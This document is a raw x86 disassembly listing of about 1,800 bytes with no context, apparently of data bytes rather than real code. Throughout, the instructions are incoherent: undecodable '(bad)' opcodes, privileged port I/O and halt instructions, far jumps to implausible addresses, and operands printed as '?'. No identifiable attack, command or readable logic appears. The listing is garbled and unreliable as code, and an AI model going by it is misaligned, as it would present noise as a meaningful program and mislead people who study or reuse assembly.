  4028c3:	sbb    BYTE PTR [ebx+edx*2],ch
  4028c6:	dec    esi
  4028c7:	psrld  mm7,QWORD PTR [esi-0x31]
  4028cb:	mov    ch,0x1
  4028cd:	in     eax,0x5a
  4028cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028d0:	shl    bh,cl
  4028d2:	add    al,0x6a
  4028d4:	mov    dl,0x51
  4028d6:	sbb    eax,0x110cdcea
  4028db:	dec    esp
  4028dc:	sbb    BYTE PTR [esi-0x44b09082],ah
  4028e2:	fwait
  4028e3:	and    esi,ebx
  4028e5:	add    al,0x4d
  4028e7:	mov    ah,0x9f
  4028e9:	mov    dh,0x1
  4028eb:	sbb    eax,0xff6849ec
  4028f0:	call   FWORD PTR [edx+0x48]
  4028f3:	jae    0x402931
  4028f5:	fisubr WORD PTR [edi-0x25]
  4028f8:	scas   eax,DWORD PTR es:[edi]
  4028f9:	les    edi,FWORD PTR ss:[ecx-0x20]
  4028fd:	xor    ebp,edx
  4028ff:	mov    DWORD PTR [edx],edx
  402901:	mov    ds:0x21330fd9,eax
  402906:	(bad)  
  402907:	out    dx,eax
  402908:	leave  
  402909:	or     cl,BYTE PTR ds:[edx+0x35]
  40290d:	or     BYTE PTR [ecx+edx*8-0x3fa58ec6],bh
  402914:	xchg   esi,eax
  402915:	sar    DWORD PTR [ebx],cl
  402917:	or     DWORD PTR [ebx+0x507848e5],esp
  40291d:	add    ah,bl
  40291f:	add    eax,0xba92f4b9
  402924:	pop    esp
  402925:	repz retf 0xab44
  402929:	jb     0x402933
  40292b:	sahf   
  40292c:	hlt    
  40292d:	mov    edx,0xf83d0d9e
  402932:	mov    DWORD PTR [edx+0x2d861e1a],esp
  402938:	jae    0x402976
  40293a:	jno    0x40298b
  40293c:	scas   al,BYTE PTR es:[edi]
  40293d:	xchg   ecx,eax
  40293e:	or     eax,0xceea1d1f
  402943:	fild   QWORD PTR [edx-0x16]
  402946:	ss out dx,al
  402948:	pusha  
  402949:	test   eax,0xe3e3e866
  40294e:	sar    DWORD PTR [edi],1
  402950:	in     al,0xce
  402952:	arpl   WORD PTR [eax],sp
  402954:	call   0x46a3a484
  402959:	cmp    al,ch
  40295b:	inc    edi
  40295c:	fisttp DWORD PTR [edx+ebx*2+0x49]
  402960:	mov    bh,0xa7
  402962:	scas   eax,DWORD PTR es:[edi]
  402963:	out    0x49,eax
  402965:	call   0x2f756ec0
  40296a:	sub    ah,BYTE PTR [esi]
  40296c:	and    al,ah
  40296e:	pop    esp
  40296f:	imul   BYTE PTR [ebp+0x71d46e0c]
  402975:	jmp    0xa3eee65c
  40297a:	int    0xda
  40297c:	adc    BYTE PTR ds:0xb9f8e03b,dh
  402982:	xor    al,0x90
  402984:	push   ss
  402985:	daa    
  402986:	pop    ebx
  402987:	sub    cl,cl
  402989:	sub    BYTE PTR [eax+edi*2+0x3e],bh
  40298d:	stc    
  40298e:	xchg   edx,eax
  40298f:	mov    ah,0x3
  402991:	mov    DWORD PTR [ecx+ecx*2+0x14b2358d],edi
  402998:	inc    ebx
  402999:	mov    bh,0xe6
  40299b:	dec    eax
  40299c:	sub    ebp,DWORD PTR [ebp+0x3d]
  40299f:	cmp    al,dh
  4029a1:	or     dh,BYTE PTR [eax]
  4029a3:	pop    ebp
  4029a4:	xor    BYTE PTR [ecx+eax*1-0x55d62446],al
  4029ab:	and    esp,ebp
  4029ad:	pusha  
  4029ae:	sub    ecx,0x2ec76e6e
  4029b4:	mov    ecx,0xddceb956
  4029b9:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029bb:	(bad)  
  4029bc:	aam    0x8f
  4029be:	(bad)
  4029c1:	inc    ebp
  4029c2:	sar    BYTE PTR [esi+0x13],1
  4029c5:	push   ss
  4029c6:	fdivp  st(2),st
  4029c8:	in     eax,dx
  4029c9:	add    esi,DWORD PTR [ebx+0x549d4a72]
  4029cf:	lock int3 
  4029d1:	fldenv fs:[edx+ebx*1]
  4029d5:	xor    eax,0xe5a8db33
  4029da:	adc    eax,0xde0f48c2
  4029df:	repnz mov al,0x51
  4029e2:	pop    esi
  4029e3:	fcom   DWORD PTR [esi+0x25]
  4029e6:	cmp    bl,BYTE PTR [ebx+0xb]
  4029e9:	jmp    0xc65194eb
  4029ee:	addr16 dec eax
  4029f0:	popf   
  4029f1:	lods   eax,DWORD PTR ds:[esi]
  4029f2:	setb   BYTE PTR [edx+eax*4]
  4029f6:	ins    DWORD PTR es:[edi],dx
  4029f7:	pop    ebp
  4029f8:	mov    eax,ds:0x8ff8ad86
  4029fd:	ret    0xedef
  402a00:	cs mov dl,0xc8
  402a03:	sub    eax,0xbff2d1bf
  402a08:	mov    ebx,0x3725fad8
  402a0d:	add    cl,BYTE PTR [ebp+0x4a99f952]
  402a13:	jno    0x4029f6
  402a15:	push   ebp
  402a16:	sbb    edi,DWORD PTR [esi+0xb]
  402a19:	pusha  
  402a1a:	add    al,0x55
  402a1c:	add    eax,0x758701e0
  402a21:	retf   
  402a22:	repz fmul st(2),st
  402a25:	lods   al,BYTE PTR ds:[esi]
  402a26:	jo     0x4029db
  402a28:	rol    al,cl
  402a2a:	or     al,BYTE PTR [edx]
  402a2c:	outs   dx,BYTE PTR ds:[esi]
  402a2d:	and    eax,0x5625fbcb
  402a32:	addr16 js 0x402a6d
  402a35:	enter  0xb9a5,0xf
  402a39:	daa    
  402a3a:	adc    edx,ecx
  402a3c:	popf   
  402a3d:	in     al,0x5e
  402a3f:	push   edx
  402a40:	fimul  DWORD PTR [edi+eax*2-0x1270e5f5]
  402a47:	outs   dx,DWORD PTR ds:[esi]
  402a48:	gs dec edx
  402a4a:	cmp    bl,BYTE PTR [eax]
  402a4c:	jmp    0xc57377c4
  402a51:	push   esi
  402a52:	mov    bh,0x5a
  402a54:	out    0x50,eax
  402a56:	sub    al,ah
  402a58:	cwde   
  402a59:	call   0xa993e928
  402a5e:	add    edx,ebx
  402a60:	sub    eax,0xbdc22324
  402a65:	xchg   esp,eax
  402a66:	sbb    ebp,DWORD PTR [edi+0x376fbaaf]
  402a6c:	adc    DWORD PTR [ebp+ecx*8+0x3bb0a1c1],eax
  402a73:	rol    DWORD PTR [edx],1
  402a75:	(bad)  
  402a76:	mov    eax,0xeafa6f0
  402a7b:	shl    DWORD PTR [edi],cl
  402a7d:	cmp    BYTE PTR [esi-0x20c4344b],bl
  402a83:	jle    0x402a5d
  402a85:	stos   DWORD PTR es:[edi],eax
  402a86:	lock das 
  402a88:	test   al,0x6f
  402a8a:	addr16 inc ebx
  402a8c:	arpl   di,dx
  402a8e:	xchg   ecx,eax
  402a8f:	addr16 mov eax,ds:0x2f14
  402a93:	aad    0xfa
  402a95:	lods   al,BYTE PTR ds:[esi]
  402a96:	jae    0x402a8d
  402a98:	stos   DWORD PTR es:[edi],eax
  402a99:	push   0xfffffff0
  402a9b:	(bad)  
  402a9c:	mov    bh,0xff
  402a9e:	sbb    eax,0xafbacabd
  402aa3:	mov    eax,ds:0x5baffa89
  402aa8:	xor    eax,0x3e07171c
  402aad:	mov    cl,0x22
  402aaf:	in     eax,dx
  402ab0:	shl    BYTE PTR [esi+0x29],cl
  402ab3:	push   0xffffff94
  402ab5:	and    al,0x57
  402ab7:	loop   0x402aaf
  402ab9:	mov    edi,0xb48685b3
  402abe:	or     edx,DWORD PTR [eax+0x3f]
  402ac1:	int3   
  402ac2:	pusha  
  402ac3:	or     eax,0xebb80f2a
  402ac8:	jmp    0x403cc607
  402acd:	sbb    edi,DWORD PTR [esi]
  402acf:	sbb    BYTE PTR [edx-0x5ca7e1ff],dh
  402ad5:	loop   0x402a99
  402ad7:	hlt    
  402ad8:	enter  0xc8cc,0xd9
  402adc:	lock push 0x796facbd
  402ae2:	jne    0x402a78
  402ae4:	adc    al,0x1f
  402ae6:	jae    0x402af2
  402ae8:	repz repnz sub BYTE PTR [ebx],cl
  402aec:	add    cl,al
  402aee:	jp     0x402b0e
  402af0:	push   ebp
  402af1:	pop    ds
  402af2:	mov    bh,0x99
  402af4:	sbb    BYTE PTR [esi+0x4d570e33],0x3
  402afb:	imul   edi,DWORD PTR [edi-0x3f],0x8ccf4200
  402b02:	xor    BYTE PTR [ecx-0x2cac09c0],dl
  402b08:	ret    0x5e00
  402b0b:	lods   eax,DWORD PTR ds:[esi]
  402b0c:	xchg   esp,eax
  402b0d:	nop
  402b0e:	js     0x402ade
  402b10:	lds    ebx,FWORD PTR [ecx-0x5e]
  402b13:	aas    
  402b14:	gs jmp 0xa13fcfd3
  402b1a:	jae    0x402aa7
  402b1c:	mov    ds:0x25b83ed6,al
  402b21:	mov    DWORD PTR [esi+edi*2+0x3a2b4fd1],edx
  402b28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b2a:	sar    BYTE PTR [eax+0x5aff90e3],cl
  402b30:	jl     0x402b90
  402b32:	adc    BYTE PTR [ebx-0x22],al
  402b35:	cmp    al,0xa
  402b37:	sbb    al,0x88
  402b39:	pop    eax
  402b3a:	jge    0x402bb9
  402b3c:	sub    ecx,DWORD PTR [ecx+0x73]
  402b3f:	(bad)  
  402b40:	(bad)  
  402b41:	not    BYTE PTR ds:0x7b42e5e7
  402b47:	sub    ax,0xf5d
  402b4b:	sahf   
  402b4c:	pop    esp
  402b4d:	push   0xffffffd5
  402b4f:	push   0x43680755
  402b54:	jnp    0x402b25
  402b56:	aam    0xc2
  402b58:	std    
  402b59:	pop    ebx
  402b5a:	cdq    
  402b5b:	(bad)  [ecx-0x8]
  402b5e:	lods   al,BYTE PTR ds:[esi]
  402b5f:	hlt    
  402b60:	push   eax
  402b61:	push   esp
  402b62:	shl    BYTE PTR [ebp-0x74],0x8f
  402b66:	shl    bl,cl
  402b68:	div    BYTE PTR [edi]
  402b6a:	sub    al,0x99
  402b6c:	mov    ebx,0xcc0f493f
  402b71:	sahf   
  402b72:	mov    cl,0x3f
  402b74:	push   ss
  402b75:	push   edi
  402b76:	loope  0x402b39
  402b78:	add    cl,BYTE PTR [eax]
  402b7a:	sbb    ecx,DWORD PTR [esi+edx*1+0x48]
  402b7e:	mov    edx,0x1f2bc261
  402b83:	inc    esi
  402b84:	fdivr  DWORD PTR [esi-0x69]
  402b87:	pop    ebp
  402b88:	jge    0x402b95
  402b8a:	sbb    DWORD PTR [edi-0x5cdb0114],ebx
  402b90:	mov    BYTE PTR [edi+0x6b356036],0xc9
  402b97:	mov    edi,0xd18aba0a
  402b9c:	std    
  402b9d:	sbb    eax,0xa1d9f448
  402ba2:	cmp    esi,eax
  402ba4:	cmp    eax,DWORD PTR [edx+0x21]
  402ba7:	mov    eax,ds:0x9071637
  402bac:	imul   esp,DWORD PTR ds:0x7b058851,0x5f
  402bb3:	mov    DWORD PTR [edx+0x2],edi
  402bb6:	xchg   DWORD PTR ds:0xa2b9091e,esi
  402bbc:	out    0x3a,al
  402bbe:	sub    al,0x10
  402bc0:	lea    esp,[eax+0x42104f6b]
  402bc6:	dec    ebp
  402bc7:	add    BYTE PTR [eax-0x36e1b666],0x84
  402bce:	aaa    
  402bcf:	xor    eax,DWORD PTR [ebp+0x45]
  402bd2:	mov    dl,0x80
  402bd4:	leave  
  402bd5:	les    esp,FWORD PTR ds:0x93c5d9db
  402bdb:	sub    DWORD PTR [ebp+0x73ef3fda],ebx
  402be1:	lahf   
  402be2:	retf   
  402be3:	cmp    DWORD PTR [ebx+0x2e],ebx
  402be6:	mov    eax,0xd98ec3b9
  402beb:	jmp    0x402c0e
  402bed:	lahf   
  402bee:	mov    dh,0x97
  402bf0:	in     al,dx
  402bf1:	frstor [edi*4+0x529e5481]
  402bf8:	retf   0xe675
  402bfb:	out    dx,eax
  402bfc:	add    BYTE PTR [ebx],dl
  402bfe:	pop    esp
  402bff:	ret    
  402c00:	xchg   edx,eax
  402c01:	jnp    0x402bf0
  402c03:	push   ebp
  402c04:	cs (bad) 
  402c06:	out    0x38,al
  402c08:	add    BYTE PTR [esi],ah
  402c0a:	adc    BYTE PTR [edx],ah
  402c0c:	dec    esi
  402c0d:	fstp   TBYTE PTR [ebp-0x5c04fac5]
  402c13:	mov    al,0x5d
  402c15:	gs nop
  402c17:	cld    
  402c18:	out    0x79,eax
  402c1a:	and    al,0x6a
  402c1c:	push   esp
  402c1d:	adc    DWORD PTR [ebp+0x4b1bd57c],edi
  402c23:	(bad)  [eax-0x50]
  402c26:	adc    cl,BYTE PTR [edx-0x10]
  402c29:	scas   al,BYTE PTR es:[edi]
  402c2a:	adc    ah,BYTE PTR [ecx+ebp*8+0x31113ce]
  402c31:	mov    al,0x26
  402c33:	sub    BYTE PTR [ebx+ebp*2-0x28287f34],dl
  402c3a:	pop    ecx
  402c3b:	xchg   BYTE PTR [esi],cl
  402c3d:	cmp    eax,0x5c4b5432
  402c42:	and    DWORD PTR [ebp+0x5351fec8],esi
  402c48:	outs   dx,BYTE PTR ds:[esi]
  402c49:	and    BYTE PTR [edx-0x61],dl
  402c4c:	sbb    al,0x46
  402c4e:	loope  0x402c42
  402c50:	(bad)  
  402c52:	cmp    BYTE PTR [ebx+0x3d],bl
  402c55:	arpl   WORD PTR [ebx-0x7be9fec6],cx
  402c5b:	(bad)  
  402c5c:	test   al,0x19
  402c5e:	mov    ebp,?
  402c60:	push   ds
  402c61:	inc    ecx
  402c62:	inc    eax
  402c63:	xor    ch,BYTE PTR [eax-0x2b9eec60]
  402c69:	jge    0x402c89
  402c6b:	add    esi,esi
  402c6d:	enter  0x5a1f,0xa4
  402c71:	sbb    eax,0xe0221e20
  402c76:	sbb    BYTE PTR [edx+0x373b1497],bl
  402c7c:	test   DWORD PTR [ebp-0x76],ecx
  402c7f:	xor    eax,0xeda0efd2
  402c84:	fcomp  DWORD PTR ds:[esi-0x76]
  402c88:	fimul  WORD PTR [esi-0x6ddc7e1d]
  402c8e:	add    al,0xd1
  402c90:	mov    dl,0xbf
  402c92:	push   ebp
  402c93:	aad    0x1
  402c95:	inc    esp
  402c96:	sub    BYTE PTR ds:0xbb5c5c57,bh
  402c9c:	fs ins DWORD PTR es:[edi],dx
  402c9e:	push   es
  402c9f:	adc    BYTE PTR [edi+0x3e],0x2f
  402ca3:	adc    eax,0x18b41963
  402ca8:	out    0x3,al
  402caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cab:	cmp    DWORD PTR [esi-0x39],eax
  402cae:	xlat   BYTE PTR ds:[ebx]
  402caf:	add    esi,DWORD PTR [eax]
  402cb1:	jecxz  0x402d1a
  402cb3:	fimul  WORD PTR [ebp+0x1a]
  402cb6:	or     eax,0x5884a36c
  402cbb:	popf   
  402cbc:	jbe    0x88a8d0d6
  402cc2:	jbe    0x402ce8
  402cc4:	cmp    eax,0xbd8d5341
  402cc9:	sbb    esp,edx
  402ccb:	or     dh,bl
  402ccd:	lods   al,BYTE PTR ds:[esi]
  402cce:	test   eax,0x5ef2acf5
  402cd3:	pusha  
  402cd4:	pop    edi
  402cd5:	out    0xb5,al
  402cd7:	ror    DWORD PTR [ecx],cl
  402cd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cda:	out    dx,eax
  402cdb:	sahf   
  402cdc:	imul   edi,edx,0xffffff9e
  402cdf:	mov    bh,0x74
  402ce1:	lahf   
  402ce2:	call   0xb980:0x3a7b2053
  402ce9:	pop    esi
  402cea:	shr    esi,1
  402cec:	lock push esi
  402cee:	mov    bh,0x36
  402cf0:	xchg   ebp,eax
  402cf1:	push   edx
  402cf2:	and    al,bl
  402cf4:	xchg   ecx,eax
  402cf5:	hlt    
  402cf6:	lock fdivr QWORD PTR [ebp-0x6f511d77]
  402cfd:	rcl    DWORD PTR cs:[edx],cl
  402d00:	sbb    esi,DWORD PTR [edx+0x2fafcbef]
  402d06:	out    0x80,eax
  402d08:	and    BYTE PTR [ecx],bl
  402d0a:	mov    ch,dl
  402d0c:	in     al,dx
  402d0d:	add    eax,0x21e5f7cd
  402d12:	add    esp,0x1a
  402d15:	xor    al,0xac
  402d17:	jns    0x402cf5
  402d19:	(bad)  
  402d1b:	sub    al,BYTE PTR [esi+edi*8-0x55f35414]
  402d22:	bound  esi,QWORD PTR [ecx-0x3d]
  402d25:	sbb    DWORD PTR [ebp-0x7629cc86],0xffffffd2
  402d2c:	xchg   ebx,eax
  402d2d:	pop    ebp
  402d2e:	mov    eax,ds:0x7333c573
  402d33:	push   es
  402d34:	sub    ch,BYTE PTR [edx]
  402d36:	lods   al,BYTE PTR ds:[esi]
  402d37:	sahf   
  402d38:	pop    ebp
  402d39:	xchg   edx,eax
  402d3a:	out    0x8,al
  402d3c:	lods   al,BYTE PTR ds:[esi]
  402d3d:	sub    al,0xb5
  402d3f:	daa    
  402d40:	or     BYTE PTR [esp+eiz*2],dl
  402d43:	scas   eax,DWORD PTR es:[edi]
  402d44:	xor    al,0x22
  402d46:	dec    edx
  402d47:	lods   al,BYTE PTR ds:[esi]
  402d48:	dec    ebp
  402d49:	inc    esi
  402d4a:	push   edi
  402d4b:	mov    BYTE PTR [ebp-0x26],dl
  402d4e:	shr    BYTE PTR [ebp-0x8cddb16],cl
  402d54:	pushf  
  402d55:	daa    
  402d56:	ds push ebx
  402d58:	inc    eax
  402d59:	enter  0x80c,0x78
  402d5d:	sub    eax,0xfe3dac22
  402d62:	push   cs
  402d63:	fstp   QWORD PTR ds:0x64ba0238
  402d69:	ja     0x402d0e
  402d6b:	(bad)  
  402d6c:	imul   DWORD PTR [edx-0x57]
  402d6f:	mov    ebp,0xbc3b75f9
  402d74:	and    eax,0x8134f10
  402d79:	xor    eax,0x784eeaf3
  402d7e:	les    esi,FWORD PTR [ebx+0x15]
  402d81:	inc    edx
  402d82:	add    DWORD PTR [ebp+0x4879f0cf],esi
  402d88:	mov    ch,0x11
  402d8a:	mov    ds:0x80aa0158,eax
  402d8f:	dec    ebp
  402d90:	jns    0x402df5
  402d92:	out    0xab,eax
  402d94:	push   ss
  402d95:	sub    edi,esp
  402d97:	xchg   ecx,eax
  402d98:	cmp    eax,0x864ef6f8
  402d9d:	loopne 0x402d98
  402d9f:	mov    WORD PTR [edx+eax*8],fs
  402da2:	xor    dl,BYTE PTR [ebp+0x56]
  402da5:	lahf   
  402da6:	je     0x402d67
  402da8:	mov    edx,DWORD PTR [edx-0x3b27612f]
  402dae:	push   ecx
  402daf:	xor    DWORD PTR [edx],ebp
  402db1:	scas   eax,DWORD PTR es:[edi]
  402db2:	mov    ds:0x9e0fccd3,eax
  402db7:	sti    
  402db8:	or     ecx,ebp
  402dba:	sbb    ch,BYTE PTR [edx]
  402dbc:	les    esp,FWORD PTR [esi+esi*8+0x4]
  402dc0:	mov    edi,0x69f49a00
  402dc5:	(bad)  
  402dc6:	lods   al,BYTE PTR ds:[esi]
  402dc7:	gs mov edi,eax
  402dca:	fistp  DWORD PTR [ebx-0x59f6ce25]
  402dd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dd1:	pushf  
  402dd2:	es push esp
  402dd4:	cli    
  402dd5:	mov    ?,WORD PTR ds:0x6871bd35
  402ddb:	pop    eax
  402ddc:	xchg   ecx,eax
  402ddd:	das    
  402dde:	mul    DWORD PTR [edi+0x49]
  402de1:	push   0xffffffc1
  402de3:	sbb    al,0x3d
  402de5:	jle    0x402ddb
  402de7:	int3   
  402de8:	sahf   
  402de9:	xor    DWORD PTR [esi-0x2b2cc03c],0xa674e503
  402df3:	xchg   ebx,eax
  402df4:	jnp    0x402e4f
  402df6:	(bad)  
  402df7:	jmp    0x402df3
  402df9:	leave  
  402dfa:	mov    ds:0xed79f8cc,eax
  402dff:	enter  0xd364,0x5d
  402e03:	out    0x4d,eax
  402e05:	hlt    
  402e06:	xlat   BYTE PTR ds:[ebx]
  402e07:	adc    ebx,DWORD PTR [edx]
  402e09:	retf   0x567d
  402e0c:	adc    bh,al
  402e0e:	jno    0x402e85
  402e10:	or     dh,bh
  402e12:	out    0x1c,eax
  402e14:	cmp    cl,BYTE PTR [esi+eiz*8+0x40]
  402e18:	mov    ecx,0xddc5a276
  402e1d:	retf   
  402e1e:	or     dh,BYTE PTR [ebx]
  402e20:	in     eax,dx
  402e21:	(bad)  
  402e22:	adc    bl,ch
  402e24:	repz retf 
  402e26:	aas    
  402e27:	push   esp
  402e28:	pop    DWORD PTR [edx+eiz*1+0x5a49cca6]
  402e2f:	daa    
  402e30:	fistp  DWORD PTR [ebx+esi*2+0x454fbadb]
  402e37:	das    
  402e38:	call   0x2b33:0x757e7333
  402e3f:	pop    ecx
  402e40:	stos   BYTE PTR es:[edi],al
  402e41:	sub    DWORD PTR [ecx-0x19],esi
  402e44:	sub    ah,BYTE PTR [edi+ebp*2+0xa01d190]
  402e4b:	aam    0x8
  402e4d:	inc    edi
  402e4e:	mov    es,WORD PTR [ebx-0x7d4fd0bb]
  402e54:	push   es
  402e55:	arpl   WORD PTR [esi],cx
  402e57:	test   BYTE PTR [edx-0x5],0xe3
  402e5b:	and    eax,0x69a9d34e
  402e60:	cwde   
  402e61:	mov    edx,0x53b90db
  402e66:	mov    esp,0x66e5a526
  402e6b:	xor    al,0xd8
  402e6d:	dec    edi
  402e6e:	sub    ch,dl
  402e70:	ins    BYTE PTR es:[edi],dx
  402e71:	test   al,0x54
  402e73:	sub    eax,0xc7019ba0
  402e78:	push   eax
  402e79:	fsubr  DWORD PTR [ebx]
  402e7b:	bound  ebp,QWORD PTR [eax+0x53]
  402e7e:	ret    0xa42e
  402e81:	cmp    eax,0x66b172ce
  402e86:	jns    0x402e64
  402e88:	test   BYTE PTR ds:0x395ffa5f,bh
  402e8e:	sahf   
  402e8f:	ret    0x825f
  402e92:	xor    al,0xc7
  402e94:	push   esi
  402e95:	dec    ecx
  402e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e97:	mov    ds:0x8ec0d8a7,eax
  402e9c:	adc    edi,DWORD PTR [ebx-0x775c8d78]
  402ea2:	cmc    
  402ea3:	fisttp WORD PTR [edx-0x266f8a59]
  402ea9:	and    eax,0xad212a7c
  402eae:	leave  
  402eaf:	loope  0x402e9a
  402eb1:	xor    eax,DWORD PTR [edx+ebp*2]
  402eb4:	mov    ds:0x1650ff03,eax
  402eb9:	and    DWORD PTR [edi+edi*8+0x11],esi
  402ebd:	inc    ebx
  402ebe:	iret   
  402ebf:	xchg   esp,eax
  402ec0:	lods   al,BYTE PTR ds:[esi]
  402ec1:	in     eax,0x21
  402ec3:	in     al,0x91
  402ec5:	dec    ecx
  402ec6:	fprem1 
  402ec8:	test   DWORD PTR [eax],ebp
  402eca:	addr16 sar bh,0xea
  402ece:	inc    edi
  402ecf:	lahf   
  402ed0:	jmp    0x36e69be7
  402ed5:	jns    0x402e6e
  402ed7:	mov    ah,0x10
  402ed9:	aaa    
  402eda:	icebp  
  402edb:	dec    eax
  402edc:	xchg   ch,bh
  402ede:	outs   dx,DWORD PTR ds:[esi]
  402edf:	push   ds
  402ee0:	(bad)  [ecx-0x26c1b050]
  402ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ee7:	sbb    al,dh
  402ee9:	or     BYTE PTR [edi-0x16],al
  402eec:	(bad)  
  402eed:	jnp    0x402f53
  402eef:	ret    
  402ef0:	(bad)  
  402ef1:	push   ecx
  402ef2:	jns    0x402e8d
  402ef4:	stc    
  402ef5:	xor    al,0x98
  402ef7:	lds    edi,FWORD PTR [ecx+0xe]
  402efa:	gs popf 
  402efc:	sub    al,0x46
  402efe:	jns    0x402ed1
  402f00:	mov    esi,DWORD PTR [ecx-0x3fc2bed4]
  402f06:	rcl    BYTE PTR [edx+0x11],0xd6
  402f0a:	xor    eax,0x5b35e91
  402f0f:	or     eax,0x3ab24397
  402f14:	jge    0x402f16
  402f16:	mov    WORD PTR [ebp+0x3f06b591],?
  402f1c:	jmp    0x402f08
  402f1e:	js     0x402f7d
  402f20:	mov    dh,0x2a
  402f22:	mov    edi,0x2e871394
  402f27:	pop    ss
  402f28:	sbb    esi,DWORD PTR [ebx+0x3e219303]
  402f2e:	pop    ebp
  402f2f:	xchg   ebp,eax
  402f30:	mov    ebp,0x574c683d
  402f35:	mov    edx,0x5ce5bbc8
  402f3a:	inc    ecx
  402f3b:	mov    DWORD PTR fs:[edi+0xc],edx
  402f3f:	mov    esp,0xa1c129ae
  402f44:	adc    al,0x8
  402f46:	mov    edi,0x6c23c32d
  402f4b:	xor    al,0x84
  402f4d:	cmp    ecx,edx
  402f4f:	cmp    bl,dh
  402f51:	cmp    bh,BYTE PTR [edi+0x58]
  402f54:	jae    0x402fb5
  402f56:	neg    DWORD PTR [eax+0x2d]
  402f59:	ja     0x402fb0
  402f5b:	out    dx,eax
  402f5c:	mov    ch,0x4a
  402f5e:	scas   al,BYTE PTR es:[edi]
  402f5f:	sbb    esi,ecx
  402f61:	jg     0x402f10
  402f63:	popf   
  402f64:	mov    al,BYTE PTR [esi+0x61706cea]
  402f6a:	dec    esp
  402f6b:	xchg   esi,eax
  402f6c:	fiadd  WORD PTR [ecx]
  402f6e:	les    eax,FWORD PTR ds:0x269c0701
  402f74:	push   eax
  402f75:	fldpi  
  402f77:	outs   dx,DWORD PTR ds:[esi]
  402f78:	pop    ecx
  402f79:	mov    ds:0xcc647214,eax
  402f7e:	sahf   
  402f7f:	je     0x402f94
  402f81:	test   BYTE PTR [ebx-0x3d7eb948],0x26
  402f88:	sahf   
  402f89:	mov    dh,0x5e
  402f8b:	std    
  402f8c:	inc    edx
  402f8d:	pop    ebp
  402f8e:	cwde   
  402f8f:	and    dl,dl
  402f91:	inc    edi
  402f92:	add    eax,0xc1d8763d
  402f97:	push   esp
  402f98:	push   edx
  402f99:	sub    dl,BYTE PTR [edx-0x6]
  402f9c:	jns    0x402f91
  402f9e:	outs   dx,BYTE PTR ds:[esi]
  402f9f:	sub    dl,ah
  402fa1:	jmp    0xf5710b1e
  402fa6:	jg     0x402f39
  402fa8:	push   0x670e5e9
  402fad:	pop    ebp
  402fae:	dec    esp
  402faf:	xchg   edi,eax
  402fb0:	push   esp
  402fb1:	or     al,bl
  402fb3:	test   eax,0x767ad65e
  402fb8:	addr16 push ds
  402fba:	adc    dh,bl
  402fbc:	inc    ecx
  402fbd:	in     al,dx
  402fbe:	add    DWORD PTR [edi],esp
  402fc0:	or     esi,DWORD PTR [ebx]
  402fc2:	mov    ebp,0xcd8e9865
  402fc7:	jae    0x402fba
  402fc9:	inc    ecx
  402fca:	cmp    cl,BYTE PTR [esi]
  402fcc:	cmp    DWORD PTR [edx+0x5324d2e3],eax
  402fd2:	add    DWORD PTR [eax+ecx*8-0x2a],eax
  402fd6:	and    ah,BYTE PTR [ebx-0xa]
  402fd9:	mov    dh,0x75
  402fdb:	add    BYTE PTR cs:[esi],dl
  402fde:	rcr    edx,cl
  402fe0:	jbe    0x403013
  402fe2:	scas   al,BYTE PTR es:[edi]
  402fe3:	int3   
  402fe4:	mov    ebx,0xd70e1804
  402fe9:	xor    edi,ebx
  402feb:	sub    ebx,DWORD PTR [ecx]
  402fed:	cmp    BYTE PTR [eax+0x6f],al
  402ff0:	sbb    DWORD PTR ss:[edi-0x78],esi
  402ff4:	in     eax,dx
  402ff5:	mov    ecx,0x32b8333
  402ffa:	jmp    0xa066:0x97f988c0
  403001:	mov    dl,BYTE PTR [ebx-0x1f4bb0e0]
  403007:	int3   
  403008:	pop    edi
  403009:	cmc    
  40300a:	ret    
  40300b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40300c:	sti    
  40300d:	pop    eax
  40300e:	ja     0x402fc2
  403010:	inc    edi
  403011:	shl    BYTE PTR [edi-0x2d928b54],0x3
  403018:	inc    ecx
  403019:	sbb    al,0xd0
  40301b:	push   es
  40301c:	pop    ecx
  40301d:	ror    DWORD PTR [edx-0x3a],0x3b
  403021:	mov    dh,0x3e
  403023:	pushf  
  403024:	(bad)  
  403025:	push   ecx
  403026:	mov    esp,DWORD PTR [ecx+0x22f410df]
  40302c:	popa   
  40302d:	xchg   esp,eax
  40302e:	shrd   esp,esp,cl
  403031:	push   ebx
  403032:	mov    cl,BYTE PTR [eax+0x16]
  403035:	add    eax,esp
  403037:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  403039:	jl     0x402fe3
  40303b:	pop    eax
  40303c:	mov    al,ds:0x8d6ff2f8
  403041:	lods   eax,DWORD PTR ds:[esi]
  403042:	into   
  403043:	xor    BYTE PTR [edi+0x1c59c21d],ah
  403049:	(bad)  
  40304a:	rcr    BYTE PTR ds:0xcd5a139f,1
  403050:	dec    eax
  403051:	das    
  403052:	lahf   
  403053:	arpl   bp,bp
  403055:	push   ebx
  403056:	jmp    0x4030b7
  403058:	sbb    ebx,edi
  40305a:	or     al,0x1c
  40305c:	add    bh,al
  40305e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40305f:	xchg   BYTE PTR [ebp-0x49],cl
  403062:	repz test al,0xb2
  403065:	mov    dh,0xff
  403067:	daa    
  403068:	retf   0x5ae7
  40306b:	adc    eax,0x44906dbc
  403070:	arpl   WORD PTR [eax-0x49],dx
  403073:	mov    al,ds:0x526c706b
  403078:	jo     0x403065
  40307a:	int    0xa6
  40307c:	int    0x24
  40307e:	cli    
  40307f:	(bad)
  403083:	scas   eax,DWORD PTR es:[edi]
  403084:	inc    edi
  403085:	cmp    ebx,DWORD PTR [edi+0x76f75d33]
  40308b:	adc    DWORD PTR [ebx+edi*4],esi
  40308e:	adc    edi,esi
  403090:	jp     0x40302e
  403092:	icebp  
  403093:	mov    DWORD PTR [edx],ebx
  403095:	and    eax,0x372f1a77
  40309a:	adc    ebp,DWORD PTR [eax-0x7f]
  40309d:	xchg   ecx,eax
